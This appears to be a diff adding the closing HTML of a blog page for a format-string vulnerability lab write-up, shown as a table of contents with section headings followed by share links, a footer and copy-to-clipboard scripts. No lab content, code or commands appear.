+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Crashing-the-Program"><span class="toc-number">1.</span> <span class="toc-text">Task 1: Crashing the Program</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Printing-Out-the-Server-Program%E2%80%99s-Memory"><span class="toc-number">2.</span> <span class="toc-text">Task 2: Printing Out the Server Program’s Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-A-Stack-Data"><span class="toc-number">2.1.</span> <span class="toc-text">Task 2.A: Stack Data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-B-Heap-Data"><span class="toc-number">2.2.</span> <span class="toc-text">Task 2.B: Heap Data</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Modifying-the-Server-Program%E2%80%99s-Memory"><span class="toc-number">3.</span> <span class="toc-text">Task 3: Modifying the Server Program’s Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-3-A-Change-the-value-to-a-different-value"><span class="toc-number">3.1.</span> <span class="toc-text">Task 3.A: Change the value to a different value.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-3-B-Change-the-value-to-0x5000"><span class="toc-number">3.2.</span> <span class="toc-text">Task 3.B: Change the value to 0x5000</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-3-C-Change-the-value-to-0xAABBCCDD"><span class="toc-number">3.3.</span> <span class="toc-text">Task 3.C: Change the value to 0xAABBCCDD.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Inject-Malicious-Code-into-the-Server-Program"><span class="toc-number">4.</span> <span class="toc-text">Task 4: Inject Malicious Code into the Server Program</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Attacking-the-64-bit-Server-Program"><span class="toc-number">5.</span> <span class="toc-text">Task 5: Attacking the 64-bit Server Program</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">5.1.</span> <span class="toc-text">一个小技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-content-0-%E7%9A%84%E5%81%8F%E7%A7%BB"><span class="toc-number">5.2.</span> <span class="toc-text">测试 content[0] 的偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-shellcode"><span class="toc-number">5.3.</span> <span class="toc-text">构造 shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91-shell"><span class="toc-number">5.4.</span> <span class="toc-text">反向 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Fixing-the-Problem"><span class="toc-number">6.</span> <span class="toc-text">Task 6: Fixing the Problem</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/a4ae304e.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/a4ae304e.html&text=Format-String-Vulnerability Lab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/a4ae304e.html&title=Format-String-Vulnerability Lab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/a4ae304e.html&is_video=false&description=Format-String-Vulnerability Lab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Format-String-Vulnerability Lab&body=Check out this article: https://ceyewan.github.io/p/a4ae304e.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/a4ae304e.html&title=Format-String-Vulnerability Lab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/a4ae304e.html&title=Format-String-Vulnerability Lab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/a4ae304e.html&title=Format-String-Vulnerability Lab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/a4ae304e.html&title=Format-String-Vulnerability Lab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/a4ae304e.html&name=Format-String-Vulnerability Lab&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/a4ae304e.html&t=Format-String-Vulnerability Lab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
